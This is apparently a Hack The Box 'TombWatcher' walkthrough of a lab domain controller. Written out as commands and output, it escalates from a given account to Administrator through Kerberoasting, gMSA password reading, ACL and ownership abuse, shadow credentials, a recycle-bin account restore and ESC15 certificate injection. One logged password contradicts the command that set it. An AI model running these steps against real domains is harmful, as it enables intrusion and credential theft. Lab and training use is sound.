# TombWatcher Walkthrough

## Recon

### Initial Scanning
--min-rate 10000: fast scanning for CTF noisy to IDS/IPS for real-world pentest -T4 is okay

nmap -p- --min-rate 10000 10.129.232.167
PORT      STATE SERVICE  
53/tcp    open  domain  
80/tcp    open  http  
88/tcp    open  kerberos-sec  
135/tcp   open  msrpc  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
5985/tcp  open  wsman  
9389/tcp  open  adws  
49666/tcp open  unknown  
49695/tcp open  unknown  
49696/tcp open  unknown  
49698/tcp open  unknown  
49717/tcp open  unknown  
62052/tcp open  unknown  

Then scan those port to find out their version:

nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.129.232.167

PORT     STATE SERVICE           VERSION  
53/tcp   open  domain            Simple DNS Plus  
80/tcp   open  http              Microsoft IIS httpd 10.0  
| http-methods:   
|_  Potentially risky methods: TRACE  
|_http-title: IIS Windows Server  
|_http-server-header: Microsoft-IIS/10.0  
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-02-02 01:36:40Z)  
135/tcp  open  msrpc             Microsoft Windows RPC  
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn  
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-02-02T01:37:47+00:00; +3h59m23s from scanner time.  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2026-02-02T01:24:06  
|_Not valid after:  2027-02-02T01:24:06  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2026-02-02T01:24:06  
|_Not valid after:  2027-02-02T01:24:06  
|_ssl-date: 2026-02-02T01:37:47+00:00; +3h59m23s from scanner time.  
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-02-02T01:37:47+00:00; +3h59m23s from scanner time.  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2026-02-02T01:24:06  
|_Not valid after:  2027-02-02T01:24:06  
3269/tcp open  globalcatLDAPssl?  
|_ssl-date: 2026-02-02T01:37:47+00:00; +3h59m23s from scanner time.  
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb  
| Not valid before: 2026-02-02T01:24:06  
|_Not valid after:  2027-02-02T01:24:06  
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp open  mc-nmf            .NET Message Framing  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  

Host script results:  
| smb2-security-mode:   
|   3.1.1:    
|_    Message signing enabled and required  
|_clock-skew: mean: 3h59m22s, deviation: 0s, median: 3h59m22s 
| smb2-time:   
|   date: 2026-02-02T01:37:10  
|_  start_date: N/A  

From the nmap above, there are many ports associated with a Window Domain Controller (https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/config-firewall-for-ad-domains-and-trusts)

The domain is tombwatcher.htb, and I will add it to /etc/hosts for easier navigate. The hostname is DC01

There are webserver and winrm so I can find credentials from their.

I use netexec to generate the hosts file and to /etc/hosts  
netexec smb 10.129.232.167 --generate-hosts-file hosts                                
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)

cat hosts                         
10.129.232.167     DC01.tombwatcher.htb tombwatcher.htb DC01  
cat hosts /etc/hosts | sudo sponge /etc/hosts

As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!

Then:
netexec smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'  
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!   

Now I do for ldap and winrm (this winrm not working)  
netexec ldap DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'  
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)  
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!  

netexec winrm DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!'  
WINRM       10.129.232.167  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.  
  arc4 = algorithms.ARC4(self._key)  
WINRM       10.129.232.167  5985   DC01             [-] tombwatcher.htb\henry:H3nry_987TGV!  

I will check this:  
website  
smb shares  
Bloodhound  
ADCS

### Website
In cmd, i curl -i http://tombwatcher.htb => It powers on ASP>NET on IIS  
HTTP/1.1 200 OK  
Content-Type: text/html  
Last-Modified: Sat, 16 Nov 2024 00:57:03 GMT  
Accept-Ranges: bytes  
ETag: "76e68173c237db1:0"  
Server: Microsoft-IIS/10.0  
X-Powered-By: ASP.NET  
Date: Mon, 02 Feb 2026 02:04:25 GMT  
Content-Length: 703  

### Directory Brute Force
I run feroxbuster -u http://tombwatcher.htb  => Nothing caught me attention

### SMB with port 445 tcp
SMB shares are the default one for Window Domain Controller

netexec smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares  
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!   
SMB         10.129.232.167  445    DC01             [*] Enumerated shares  
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark  
SMB         10.129.232.167  445    DC01             -----           -----------     ------  
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.232.167  445    DC01             C$                              Default share  
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share   
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share   

=> Nothing interesting

We use smb to do find users  
netexec smb DC01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --users  

SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!   
SMB         10.129.232.167  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-  
SMB         10.129.232.167  445    DC01             Administrator                 2025-04-25 14:56:03 0       Built-in account for administering the computer/domain  
SMB         10.129.232.167  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain  
SMB         10.129.232.167  445    DC01             krbtgt                        2024-11-16 00:02:28 0       Key Distribution Center Service Account  
SMB         10.129.232.167  445    DC01             Henry                         2025-05-12 15:17:03 0   
SMB         10.129.232.167  445    DC01             Alfred                        2025-05-12 15:17:03 0   
SMB         10.129.232.167  445    DC01             sam                           2025-05-12 15:17:03 0   
SMB         10.129.232.167  445    DC01             john                          2025-05-19 13:25:10 0   
SMB         10.129.232.167  445    DC01             [*] Enumerated 7 local users: TOMBWATCHER  

### Bloodhound - Collection
Let's do some bloodhound

I will collect Bloundhound data

 bloodhound-ce-python -d tombwatcher.htb \
                       -dc dc01.tombwatcher.htb \
                       -u henry \
                       -p 'H3nry_987TGV!' \
                       -c All \
                       -ns 10.129.232.167 \
                       --dns-tcp \
                       --zip

INFO: BloodHound.py for BloodHound Community Edition  
INFO: Found AD domain: tombwatcher.htb  
INFO: Getting TGT for user  
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  
INFO: Connecting to LDAP server: dc01.tombwatcher.htb  
INFO: Testing resolved hostname connectivity dead:beef::244e:e559:fc03:59e0  
INFO: Trying LDAP connection to dead:beef::244e:e559:fc03:59e0  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 1 computers  
INFO: Connecting to LDAP server: dc01.tombwatcher.htb  
INFO: Testing resolved hostname connectivity dead:beef::244e:e559:fc03:59e0  
INFO: Trying LDAP connection to dead:beef::244e:e559:fc03:59e0  
INFO: Found 9 users  
INFO: Found 53 groups  
INFO: Found 2 gpos  
INFO: Found 2 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer: DC01.tombwatcher.htb  
INFO: Done in 00M 07S  
INFO: Compressing output into 20260201172735_bloodhound.zip  

I 'MATCH (n) DETACH DELETE n' clear neo4j previous data

I start loading the zip file to bloodhound. I look at Outbound Control
The user alfred is able to add themself to the INFRASTRUCTURE group, granting all members the privilege to read the password of the group-managed service account ansible_dev$

### Authentication as Alfred
We use Kerberoast

From this walkthrough 0xdf, Kerberoasting is targeting a service account because it has service principal name (SPN) configured, which means that any authenticated user can request a TGS for that account. That TGS is encrypted with the service account’s password, and if that password is weak, it can be bruteforced offline with something like hashcat.

Targeted Kerberoasting involves adding an SPN to an account, and then Kerberoasting it (and ideally removing it after).

So while Alfred is almost certainly a user and not a service account, with the WriteSPN access over the account, I can make it Kerberoastable and look for a weak password.

I add SPN to alfred using bloodyAD

Through adding a SPN to alfred I can request a TGS for that account and attempt to bruteforce the password. Adding the attribute and requesting the ticket to extract the hash can be automated with targetedKerberoast (https://github.com/ShutdownRepo/targetedKerberoast?tab=readme-ov-file)

faketime -f +4h python targetedKerberoast.py -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --request-user alfred

[*] Starting kerberoast attacks    
[*] Attacking user (alfred)  
[+] Printing hash for (Alfred)  
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$57ce4f8cd700285f7d1b1b99c303c3c0$ae37de40a4befc7bf33ccfeef7212f3ba5d3b774e5ae337306e4a1b55fd2d465c7589364c7917018a4bf1b5a37b333cfc127232b9e2489207c7bb704f1a5531c6e90a362679a25bef212cc5512abc17a26da1230caf819d8d22f16325712c28803376cc759fa785b11b2c81d83f95eaaa993de4a34927996943594d050ede405eccea256f0f98e1983d3a39647f6c9d36aad279d9813c94d48e28d93e00062af3621469e30777918994fe8595237082a844f0d74d96a9f70984d90dab287f8ee44a049feaa5ae192a4e76fd87d0559955ccc5a350bc8520b95eba03dcc066e8120883172c9207505741af3bbbcaa375983300c8e44308fd3c203a0057ae008410ca35abfe2ad78a36aaf2f6baf18b746da75c352581f620b5ef733b56cc21290d1c106e46a14554cec7e0653d6f65c0eae9fbf0192ab43d7e5cc0acfc9082e7c08f3e70f99dfe30edaa87b5cea57f9033dcf40919953b94953ee406f59f560290c511a40c4a256483bf700687ac43e9fe383df7f7d79f59fd006a25fc4a0f09d3d75c5999e0be4c768a050c06296d405d265381a353ec6f543593642827b741820ff0eabb076806535b0bf08b53ebb0321bc030ecbbd29cdb422632a2c4a0af0d187e39010a7f15835d33101ae4dc61571a62709e287f20fcc82376162d93d5c3c546fe570eaf69e28e4746cb391ccdd1145e432bdb15e0c4340199f4e0fa40682ec9402fb4ef8a0d489bbe2f48aedc06e4e3de463c784bd3018a92ab7823e42b778b77004e81af077f0f060c1e7c3b201021e53fe70f007fb646ca9e017e0c7383a741e6788e53b79b668ee77da3533f642dda04f1075c3febc3e45e18081a0a44ee050e0bac40a16739fd7b8d652083322928c1d8511979c0d08a1df1fe5e01ba285bb5f410e8a219a9e5ae078e5e87936a516d42d94893f693d842baff0c51bb448f9068e652d85dc8043fc561a7a9a3b1bcc42076a2d61a834e26ac915dda74e458833d2eba3adcbe616fd6449c10bfb29ed74bec7519c660cd051dd28cae150377623fffb6552edc8cb1f2c0d9bb8db9af74546af5b9387d836b8fa105426b2b3454aad1d93f82f4f3330b69c54f4068ce88335768ad053344a16c611696fdefa6ee2b2c6a2a20246aa00ecb0660b3e477126a8a8353e1f965c7c88cc3fdce148ef57634640449ece335432ebb12014b7a91447ee4b372cfdb7634d943cc604ca5d6cf7d3ccc056ca125472d802f91e4fd30b810e919762da5bddce77a26a279865b89f55d9788991c3e29ee4402f208a97de94b2ad68dd06425be5c545fe85998dcfef716afa7aabd01ff17c07ba105577fca4064eda6e5aad0f159da5ab1ceb7513764f53cf4e864bb3c0a19f02b97504bcc43417705e44c1579ac141e0010607b28875bed7af0d3418b67f9e13e29997d76247f439d4f8bc0c957fa6f7e16555edbe58902656d4464d33010a1d0f0c54ab

I cracked via hashcat alfred.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

I got "basketball"

I validated the credentials using netexec

netexec smb dc01.tombwatcher.htb -u alfred -p basketball  
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\alfred:basketball   

### Authentication as ansible_dev$

I go back to Bloodhound data, Alfred has AddSelf over the Infrastructure group, which can ReadGMSAPassword from the ANSIBLE_DEV$ account

I used netexec tored NTLM but can read

netexec ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa  
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)  
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\alfred:basketball   
LDAP        10.129.232.167  389    DC01             [*] Getting GMSA Passwords  
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: Infrastructure  

Then I will add alfread using bloddyAD  
bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember Infrastructure alfred  
[+] alfred added to Infrastructure

Now I can use alfred to read using netexec
netexec ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa  
LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)  
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\alfred:basketball   
LDAP        10.129.232.167  389    DC01             [*] Getting GMSA Passwords  
LDAP        10.129.232.167  389    DC01             Account: ansible_dev$         NTLM: 22d7972cb291784b28f3b6f5bc79e4cf     PrincipalsAllowedToReadPassword: Infrastructure  

netexec validates that the hash is working    
netexec smb dc01.tombwatcher.htb -u 'ANSIBLE_DEV$' -H 22d7972cb291784b28f3b6f5bc79e4cf  
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\ANSIBLE_DEV$:22d7972cb291784b28f3b6f5bc79e4cf  

### Authentication as Sam

ANSIBLE_DEV$ has ForceChangePassword over Sam

bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':22d7972cb291784b28f3b6f5bc79e4cf' --host dc01.tombwatcher.htb set password "sam" "0xdf0xdf" 
[+] Password changed successfully!

It checks

netexec smb DC01.tombwatcher.htb -u sam -p '0xdf0xdf'                               
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\sam:Helloworld123   

## Shell as john

With WriteOwner over John, I can set Sam as the owner of the John account. So as the owner, Sam can give him genericAll over John. I can reset the password, get a shadow credential, can login with evil-winrm.

Now I set the owner of John to sam with bloodyAD  

bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf' --host dc01.tombwatcher.htb set owner john sam 
[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john  

Then I will give Sam GenericAll over John  
bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf' --host dc01.tombwatcher.htb add genericAll john sam 
[+] sam has now GenericAll on john  

certipy-ad shadow auto -target dc01.tombwatcher.htb -u sam -p '0xdf0xdf' -account john  
We the hash NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2bf

We netexec on smb and winrm

┌──(kali㉿kali)-[~/htb/TombWatcher/targetedKerberoast]  
└─$ netexec smb dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf  
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf  
                                                                                                        
┌──(kali㉿kali)-[~/htb/TombWatcher/targetedKerberoast]  
└─$ netexec winrm dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf  
WINRM       10.129.232.167  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed   from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.  
  arc4 = algorithms.ARC4(self._key)  
WINRM       10.129.232.167  5985   DC01             [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf (Pwn3d!)  

Then I used evil-winrm

evil-winrm -i dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf

I am in

*Evil-WinRM* PS C:\Users\john\Documents> whoami  
tombwatcher\john

Then I navigate through Desktop directory to get user flag:    
*Evil-WinRM* PS C:\Users\john\Desktop> cat user.txt  
abd2a7cc989131f4d836947942a1b7f9

### Authentication as cert

The John user's home dir is only have user.txt  
There is Administrator in Users directory   
*Evil-WinRM* PS C:\Users> ls  

Mode                LastWriteTime         Length Name  
----                -------------         ------ ----  
d-----       11/15/2024   7:57 PM                .NET v4.5  
d-----       11/15/2024   7:57 PM                .NET v4.5 Classic  
d-----       12/11/2024   5:38 PM                Administrator  
d-----       12/11/2024   6:42 PM                john  
d-r---       11/15/2024   6:52 PM                Public  

So nothing interesting I go back Bloodhound JOHN has a GenericAll relationship over the ADCS Organizational Unit.

At each compromised user, I look at the enrollment rights of that user with respect to ADCS

None of the users or groups compromised have any special configuration as far as ADCS

Domain Computers (ANSIBLE_DEV$ is a member) provides access to three different templates

None of these templates show any vulnerabilities in Bloodhound

I still use certipy-ad to see anything 

certipy-ad find -target dc01.tombwatcher.htb -u john -hashes :ad9324754583e3e42b55aad4d3b8d2bf -stdout

[*] Finding certificate templates  
[*] Found 33 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 11 enabled certificate templates  
[*] Finding issuance policies  
[*] Found 13 issuance policies  
[*] Found 0 OIDs linked to templates  
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:10.200.73.101@53 answered The DNS operation timed out.; Server Do53:192.168.227.2@53 answered   SERVFAIL; Server Do53:10.200.73.101@53 answered The DNS operation timed out.; Server Do53:10.200.73.101@53 answered The DNS operation timed out.  
[!] Use -debug to print a stacktrace  
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'  
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'  
[!] Error checking web enrollment: timed out  
[!] Use -debug to print a stacktrace  
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'  
[*] Saving text output to '20260201234009_Certipy.txt'  
[*] Wrote text output to '20260201234009_Certipy.txt'  
[*] Saving JSON output to '20260201234009_Certipy.json'  
[*] Wrote JSON output to '20260201234009_Certipy.json'  

There is a single CA names tombwatcher-CA-1 with 11 templates


I have enrollment access having compromised ANSIBLE_DEV$ which is in the Domain Computers group. certipy calls out that this could be used in ESC2 and ESC3 attacks, but not on it’s own. The User template has the same remarks, and I have access via Domain Users.

#### User 1111

This user is in the Bloodhound data, which shows the enrollment via Outbound Control and we don't have a lot of information on this user 

This could be someone delete. We could use AD recycle bin to recover deleted AD objects

*Evil-WinRM* PS C:\Users> Get-ADOptionalFeature 'Recycle Bin Feature'

Then:

Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent

After execute that cmd, I saw DistinguishedName : CN=cert_admin\ => the cert_admin and last user has RID1111. The lastKnownParent attribute is added to Recycle Bin objects, and it shows it was in the ADCS OU

Time to recover cert_admin

Since john has GenericAll over ADCS, and ADCS is cert_admin's lastKnownParent, John is able to recover this account. I obtain ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf

*Evil-WinRM* PS C:\Users> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf  
*Evil-WinRM* PS C:\Users>  Get-ADUser cert_admin  


DistinguishedName : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb                                          
Enabled           : True  
GivenName         : cert_admin  
Name              : cert_admin  
ObjectClass       : user  
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf  
SamAccountName    : cert_admin  
SID               : S-1-5-21-1392491010-1358638721-2126982587-1111  
Surname           : cert_admin  
UserPrincipalName :  

=> Nice I was able to recover it and now we can change password

*Evil-WinRM* PS C:\Users> Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)

Let's check using netexec

netexec smb dc01.tombwatcher.htb -u cert_admin -p Password123!   
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\cert_admin:Password123!   

Enable the cert_admin acc to use again   
*Evil-WinRM* PS C:\Users> Enable-ADAccount -Identity cert_admin


### Shell as Admin

I will rerun certipy to look any vulnerable

─(kali㉿kali)-[~/htb/TombWatcher]  
└─$ certipy-ad find -target dc01.tombwatcher.htb -u cert_admin -p Password123! -vulnerable -stdout  

[+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin  
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.  
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.  

And it was vuln to ESC15 (I thnk from ESC1 to ESC15)

The output shows ESC15 (CVE-2024-49019 / “EKUwu”) is present — the CA is vulnerable to Application Policy injection.

ESC15 (aka “EKUwu”)

ESC15 (CVE-2024-49019) is a post-compromise AD CS flaw that lets an attacker supply arbitrary Application Policies when enrolling certificates from Schema v1 (V1) templates that allow “enrollee supplies subject.” A vulnerable CA may include those attacker-supplied policies (for example Client Authentication or Enrollment Agent) in the issued cert, enabling unexpected actions like client logon or acting as an enrollment agent — which can lead to privilege escalation and domain compromise.

More reading: Certipy Wiki

Some indicators are Enrollee Supplies Subject = True, Schema Version is 1, No patch for CVE-2024-49019 until Nov 2024

Scenario A
I try to use req feature to request a Cert as the admin to inject and try to use it as client authentication

certipy-ad req -u cert_admin -p 'Password123!' -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb   -application-policies 'Client Authentication'
Certipy v5.0.4 - by Oliver Lyak (ly4k)  

[*] Requesting certificate via RPC  
[-] Got error: rpc_s_access_denied  
[-] Use -debug to print a stacktrace  

=> Access denied

Scenario B  
I am trying Scenario B, I will give to agent property

Essentially, we should follow below steps:

1-Request a cert from the vulnerable WebServer template using the Certificate Request Agent policy.  
certipy-ad req -u cert_admin -p 'Password123!' -dc-ip  10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'

2-Use that agent cert to request a second certificate on behalf of the domain admin.
certipy-ad req -u cert_admin -p 'Password123!' -dc-ip  10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template User -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'

3-Authenticate with the newly obtained certificate , and that’s how we end up with the hash.
certipy auth -pfx administrator.pfx -dc-ip 10.129.232.167

[*] Got hash for 'administrator@tombwatcher.htb': aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc


Then I use the hash with evil-winrm to log in as administrator

┌──(kali㉿kali)-[~/htb/TombWatcher/targetedKerberoast]    
└─$ evil-winrm -i dc01.tombwatcher.htb -u administrator -H f61db423bebe3328d33af26741afe5fc

Then I go to Desktop to get Root flag  
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt  
0a27d9b812b8feef8256c5dce070d585  
